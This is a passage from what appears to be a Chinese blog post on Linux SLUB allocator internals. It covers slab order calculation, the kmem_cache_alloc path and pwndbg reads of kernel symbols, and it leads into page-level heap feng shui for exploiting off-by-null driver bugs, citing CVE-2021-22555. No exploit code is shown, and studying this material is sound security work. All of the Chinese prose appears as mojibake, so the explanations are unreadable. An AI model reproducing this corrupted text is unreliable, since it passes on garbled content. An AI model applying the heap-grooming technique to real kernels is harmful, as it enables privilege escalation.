class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (min_objects &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fraction;</span><br><span class="line"></span><br><span class="line">fraction = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">while</span> (fraction &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">order = calc_slab_order(size, min_objects,</span><br><span class="line">slub_max_order, fraction);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">fraction /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">min_objects--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We were unable to place multiple objects in a slab. Now</span></span><br><span class="line"><span class="comment"> * lets see if we can place a single object there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, slub_max_order, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Doh this slab cannot be placed using slub_max_order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, MAX_ORDER, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"><span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°æœ€ç»ˆçš„orderæ˜¯ç”±<code>calc_slab_order</code>å‡½æ•°ç”Ÿæˆçš„ã€‚è€Œè¿™é‡Œçš„<code>min_objects</code>å˜é‡å¯ä»¥çœ‹åˆ°æ˜¯ç”±<code>slub_min_objects</code>èµ‹å€¼çš„ã€‚è¿™ä¸ªå…¨å±€å˜é‡çš„å«ä¹‰æ˜¯ï¼šæ¯ä¸ªslabçš„æœ€å°objectæ•°é‡ï¼Œåœ¨æ²¡æœ‰é…ç½®çš„æƒ…å†µä¸‹æ˜¯0ã€‚ä¸è¿‡å¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯0çš„è¯ä¼šè¿›å…¥åˆ°ç´§æ¥ç€çš„ifè¯­å¥å†…ï¼Œå†…éƒ¨çš„<code>nr_cpu_ids</code>å˜é‡çš„å€¼æ˜¯å¤„ç†å™¨æ•°ã€‚fls å¯ä»¥è·å–å‚æ•°çš„æœ€é«˜æœ‰æ•ˆ bit çš„ä½æ•°ï¼Œæ¯”å¦‚ fls(0)=0ï¼Œfls(1)=1ï¼Œfls(4) = 3ã€‚å¦‚æœå½“å‰ç³»ç»Ÿä¸­æœ‰4ä¸ªcpuï¼Œé‚£ä¹ˆ min_object çš„åˆå§‹å€¼ä¸º 4*(3+1) = 16ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep slub_min_objects</span><br><span class="line">ffffffff8a23b2d0 t __cfi_setup_slub_min_objects</span><br><span class="line">ffffffff8a23b2e0 t setup_slub_min_objects</span><br><span class="line">ffffffff8a4348af t __setup_str_setup_slub_min_objects</span><br><span class="line">ffffffff8a45e460 t __setup_setup_slub_min_objects</span><br><span class="line">ffffffff8b3d5fbc b slub_min_objects</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff8b3d5fbc</span><br><span class="line">0xffffffff8b3d5fbc:0x00000000</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep nr_cpu_ids</span><br><span class="line">ffffffff97f73fa8 D nr_cpu_ids</span><br><span class="line">ffffffff98025f10 T __cfi_setup_nr_cpu_ids</span><br><span class="line">ffffffff98025f20 T setup_nr_cpu_ids</span><br><span class="line">ffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff97f73fa8</span><br><span class="line">0xffffffff97f73fa8:0x00000004</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤æŸ¥çœ‹ä¹‹åå¯ä»¥çœ‹åˆ°<code>nr_cpu_ids</code>çš„å€¼ä¸º4ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>min_object</code>çš„å€¼ä¸º<code>0x10</code>ã€‚</p><p>è€Œå‡½æ•°ä¸­<code>fraction</code>æ˜¯å¯¹äºç¢ç‰‡çš„ä¸€ç§æŒ‡æ ‡ã€‚ç¢ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡ (slabæ‰€å å†…å­˜å¤§å° / fraction)ï¼Œfraction å€¼è¶Šå¤§ï¼Œslab ä¸­æ‰€èƒ½å®¹å¿çš„ç¢ç‰‡å°±è¶Šå°ã€‚</p><h4 id="calc-slab-orderå‡½æ•°"><a href="#calc-slab-orderå‡½æ•°" class="headerlink" title="calc_slab_orderå‡½æ•°"></a>calc_slab_orderå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="number">1UL</span> &lt;&lt; l) &lt; v)</span><br><span class="line">l++;</span><br><span class="line"><span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline __attribute_const__ <span class="keyword">int</span> <span class="title">get_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> BITS_PER_LONG - PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt; (<span class="number">1UL</span> &lt;&lt; PAGE_SHIFT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ilog2((size) - <span class="number">1</span>) - PAGE_SHIFT + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size--;</span><br><span class="line">size &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 32</span></span><br><span class="line"><span class="keyword">return</span> fls(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> fls64(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc_slab_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> fract_leftover)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_order = slub_min_order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)</span><br><span class="line"><span class="keyword">return</span> get_order(size * MAX_OBJS_PER_PAGE) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (order = max(min_order, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_order(min_objects * size));</span><br><span class="line">order &lt;= max_order; order++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> slab_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> rem;</span><br><span class="line"></span><br><span class="line">rem = slab_size % size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rem &lt;= slab_size / fract_leftover)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯æœ€ç»ˆè®¡ç®—å‡º<code>order</code>çš„å‡½æ•°äº†ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šä»slabæ‰€éœ€è¦çš„æœ€å°orderåˆ°æœ€å¤§orderä¹‹é—´å¼€å§‹éå†ï¼ŒæŸ¥æ‰¾èƒ½å¤Ÿä½¿slabç¢ç‰‡æœ€å°çš„orderå€¼ã€‚è€Œremåˆ™æ˜¯slabçš„ç¢ç‰‡å¤§å°ï¼šåˆ†é…å®Œobjectä¹‹åï¼Œæ‰€äº§ç”Ÿçš„ç¢ç‰‡å¤§å°ã€‚ç¢ç‰‡å¤§å°remä¸èƒ½è¶…è¿‡<code>slab_size / fract_leftover</code>å³ç¬¦åˆè¦æ±‚ã€‚</p><p>è¿™é‡Œçš„<code>get_order</code>å‡½æ•°ä¹Ÿè¾ƒä¸ºç®€å•ï¼Œ<del>è¿™ç‹—å±ç©æ„ï¼Œå¼€å§‹çœ‹é”™äº†æ–‡ä»¶å¯¼è‡´ä¸€ç›´çœ‹ä¸æ‡‚ï¼Œç¡¬ç”Ÿç”Ÿçœ‹äº†ä¸¤ä¸ªå°æ—¶æ‰ååº”è¿‡æ¥äº†</del>ã€‚ä¹Ÿå°±æ˜¯æ ¹æ®sizeè¿”å›å¯¹åº”çš„æœ€å°çš„<code>order</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„å¦‚æœæ ¹æ®ä¸Šä¸€ä¸ªå‡½æ•°ä¸­çš„<code>min_object</code>çš„å€¼ä¸º<code>0x10</code>æ¥çœ‹çš„è¯ï¼Œæœ€ç»ˆè¿”å›çš„<code>order</code>ä¹Ÿå°±æ˜¯3ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache_order_objects <span class="title">oo_make</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">x</span> =</span> &#123;</span><br><span class="line">(order &lt;&lt; OO_SHIFT) + order_objects(order, size)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åç”±<code>oo_make</code>å‡½æ•°å†™å…¥åˆ°ooæˆå‘˜ä¸­å»äº†ã€‚</p><h3 id="kmem-cache-allocæµç¨‹"><a href="#kmem-cache-allocæµç¨‹" class="headerlink" title="kmem_cache_allocæµç¨‹"></a>kmem_cache_allocæµç¨‹</h3><p>å¯ä»¥çœ‹åˆ°å‰é¢<code>kmem_cache_create_usercopy</code>å‡½æ•°åªæ˜¯å¯¹<code>kmem_cache</code>ç»“æ„ä½“é‡Œé¢çš„æˆå‘˜è¿›è¡Œåˆå§‹åŒ–èµ‹å€¼ï¼Œå¹¶æ²¡æœ‰å®è´¨æ€§çš„ç”Ÿæˆslabã€‚è€ŒçœŸæ­£åˆ†é…slabæ˜¯åœ¨ç¬¬ä¸€æ¬¡å¯¹è¿™ä¸ªcacheç”³è¯·objectçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå°æ ‡é¢˜çš„å‡½æ•°ã€‚</p><p>è¿™é‡Œçš„è°ƒç”¨æµç¨‹å°±æ˜¯ï¼š<code>kmem_cache_alloc</code>=&gt;<code>__kmem_cache_alloc_lru</code>=&gt;<code>slab_alloc</code>=&gt;<code>slab_alloc_node</code>=&gt;<code>__slab_alloc_node</code>=&gt;<code>new_slab</code>=&gt;<code>allocate_slab</code>=&gt;<code>alloc_slab_page</code></p><h4 id="slab-alloc-nodeå‡½æ•°"><a href="#slab-alloc-nodeå‡½æ•°" class="headerlink" title="__slab_alloc_nodeå‡½æ•°"></a>__slab_alloc_nodeå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">object = get_partial(s, node, &amp;pc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">object = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ†é…é¡ºåºå°±æ˜¯é¦–å…ˆè®¿é—®<code>partial</code>æŒ‡é’ˆä¸­ï¼Œå¦‚æœå…¶ä¸­æ²¡æœ‰å¯ä»¥è¿”å›çš„objectå°±ä¼šæ‰§è¡Œåˆ°<code>new_slab</code>å‡½æ•°åˆ†é…æ–°çš„slabã€‚</p><h4 id="alloc-single-from-new-slabå‡½æ•°"><a href="#alloc-single-from-new-slabå‡½æ•°" class="headerlink" title="alloc_single_from_new_slabå‡½æ•°"></a>alloc_single_from_new_slabå‡½æ•°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">alloc_single_from_new_slab</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab, <span class="keyword">int</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nid = slab_nid(slab);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, nid);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = get_freepointer(s, object);</span><br><span class="line">slab-&gt;inuse = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!alloc_debug_processing(s, slab, object, orig_size))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s not really expected that this would fail on a</span></span><br><span class="line"><span class="comment"> * freshly allocated slab, but a concurrent memory</span></span><br><span class="line"><span class="comment"> * corruption in theory could cause that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;inuse == slab-&gt;objects)</span><br><span class="line">add_full(s, n, slab);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_HEAD);</span><br><span class="line"></span><br><span class="line">inc_slabs_node(s, nid, slab-&gt;objects);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦åšçš„äº‹å°±æ˜¯é¦–å…ˆå–ä¸‹<code>freelist</code>æŒ‡å‘çš„objectï¼Œéšåå°†slabæ·»åŠ åˆ°<code>partial</code>æŒ‡é’ˆå¤„ã€‚</p><h4 id="allocate-slabå‡½æ•°"><a href="#allocate-slabå‡½æ•°" class="headerlink" title="allocate_slabå‡½æ•°"></a>allocate_slabå‡½æ•°</h4><p>ä¸Šé¢æåˆ°äº†<code>new_slab</code>å‡½æ•°ï¼Œå…¶å®å®è´¨ä¸Šè°ƒç”¨çš„æ˜¯è¿™ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct slab *<span class="title">allocate_slab</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span> =</span> s-&gt;oo;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_gfp;</span><br><span class="line"><span class="keyword">void</span> *start, *p, *next;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">bool</span> shuffle;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">oo = s-&gt;min;</span><br><span class="line">alloc_gfp = flags;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Allocation may have failed due to fragmentation.</span></span><br><span class="line"><span class="comment"> * Try a lower order alloc if possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">stat(s, ORDER_FALLBACK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">slab-&gt;objects = oo_objects(oo);</span><br><span class="line">slab-&gt;inuse = <span class="number">0</span>;</span><br><span class="line">slab-&gt;frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">account_slab(slab, oo_order(oo), s, flags);</span><br><span class="line"></span><br><span class="line">slab-&gt;slab_cache = s;</span><br><span class="line"></span><br><span class="line">kasan_poison_slab(slab);</span><br><span class="line"></span><br><span class="line">start = slab_address(slab);</span><br><span class="line"></span><br><span class="line">setup_slab_debug(s, slab, start);</span><br><span class="line"></span><br><span class="line">shuffle = shuffle_freelist(s, slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!shuffle) &#123;</span><br><span class="line">start = fixup_red_left(s, start);</span><br><span class="line">start = setup_object(s, start);</span><br><span class="line">slab-&gt;freelist = start;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="number">1</span>; idx++) &#123;</span><br><span class="line">next = p + s-&gt;size;</span><br><span class="line">next = setup_object(s, next);</span><br><span class="line">set_freepointer(s, p, next);</span><br><span class="line">p = next;</span><br><span class="line">&#125;</span><br><span class="line">set_freepointer(s, p, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹äºæ–°åˆ†é…çš„slabé¦–å…ˆå†™çš„å°±æ˜¯ä»–çš„<code>freelist</code>æŒ‡é’ˆï¼Œæ‰€ä»¥æ ¹æ®ä¸Šé¢å¤–å±‚å‡½æ•°çš„è°ƒç”¨é¡ºåºæ¥çœ‹ï¼Œåœ¨åˆšæŒ‚è½½åˆ°<code>freelist</code>ç´§æ¥ç€å°±ä¼šè¿”å›objectå¹¶é‡æ–°æŒ‚è½½åˆ°<code>partial</code>ä¸Šã€‚</p><p>ä¹Ÿå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨äº†åœ¨slabåˆ†é…åˆ†æå¼€å¤´ç»™å‡ºçš„å‡½æ•°<code>alloc_slab_page</code>ã€‚</p><h2 id="é¡µçº§å †é£æ°´æ„é€ "><a href="#é¡µçº§å †é£æ°´æ„é€ " class="headerlink" title="é¡µçº§å †é£æ°´æ„é€ "></a>é¡µçº§å †é£æ°´æ„é€ </h2><p>ç»ˆäºè¦è¯´åˆ°è·Ÿé¢˜ç›®æœ‰å…³ç³»çš„å†…å®¹äº†ã€‚</p><p>å¦‚æœæåˆ°ä¸€ä¸ªé©±åŠ¨å­˜åœ¨<code>off by null</code>æˆ–è€…<code>off by one</code>æ¼æ´æ—¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯è¿™ä¸ª<a class="link"   href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/" >CVE-2021-22555<i class="fas fa-external-link-alt"></i></a>ä¸­çš„åŠæ³•ï¼Œä½¿ç”¨å¤§é‡å †å–·æ¥å®Œæˆã€‚ä½†æ˜¯å¦‚æœé¢˜ç›®çš„slabæ˜¯ç”±<code>kmem_cache_create_usercopy</code>åˆ›å»ºçš„è¯å›°éš¾å°±ä¼šå­˜åœ¨å¾ˆå¤§çš„é—®é¢˜äº†ï¼Œå¦‚æœä½ å½“å‰ä½¿ç”¨å †å–·çš„å †å—çš„orderä¸åˆ›å»ºçš„cacheä¸ä¸€è‡´ï¼Œè¿™æ ·åªæœ‰æä½çš„æ¦‚ç‡å¯ä»¥è®©é©±åŠ¨ç”Ÿæˆçš„slabç´§é‚»å †å–·çš„slabã€‚æ‰€ä»¥ä¸ºäº†æé«˜è„šæœ¬çš„ç¨³å®šæ€§ï¼Œå‡ºç°äº†è¿™ä¸€åˆ©ç”¨æ‰‹æ³•ã€‚</p><p>å…¶å®è¿™ä¸€æ‰‹æ³•ä»¥å‰åœ¨å®‰å…¨å®¢ä¸­æœ‰çœ‹åˆ°ä½†æ˜¯å½“æ—¶å¹¶æ²¡æœ‰åœ¨æ„ï¼Œæ‰€ä»¥ç°åœ¨å€Ÿç€å¢¨æ™šé¸¢ä½¬çš„åšå®¢å­¦ä¹ ä¸€ä¸‹ã€‚é¡µçº§å †é£æ°´å³ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„å†…å­˜æ’å¸ƒæ–¹å¼ï¼Œè€Œå†…æ 